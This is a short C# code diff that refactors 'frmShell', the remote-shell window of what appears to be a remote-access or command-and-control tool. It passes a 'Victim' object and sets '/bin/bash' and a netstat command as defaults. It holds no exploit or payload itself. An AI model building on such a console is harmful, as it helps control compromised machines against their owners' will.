@@ -12,8 +12,8 @@ namespace Eden
 {
     public partial class frmShell : Form
     {
-        private Client m_clnt;
-        private string m_szVictimID;
+        private Victim m_victim;
+        public string m_szVictimID;
 
         private enum HistoryCmd
         {
@@ -21,12 +21,11 @@ namespace Eden
             Next,
         }
 
-        public frmShell(Client clnt, string szVictimID)
+        public frmShell(Victim victim)
         {
             InitializeComponent();
 
-            m_clnt = clnt;
-            m_szVictimID = szVictimID;
+            m_victim = victim;
         }
 
         private void fnReceived(Client m_clnt, string szVictimID, string[] aszMsg)
@@ -82,7 +81,7 @@ namespace Eden
             textBox1.Text = "/bin/bash";
             textBox2.Text = "netstat -ano | grep \"ESTABLISHED\"";
 
-            m_clnt.ServerMessageReceived += fnReceived;
+            m_victim.m_clnt.ServerMessageReceived += fnReceived;
 
             fnInitCmd();
         }
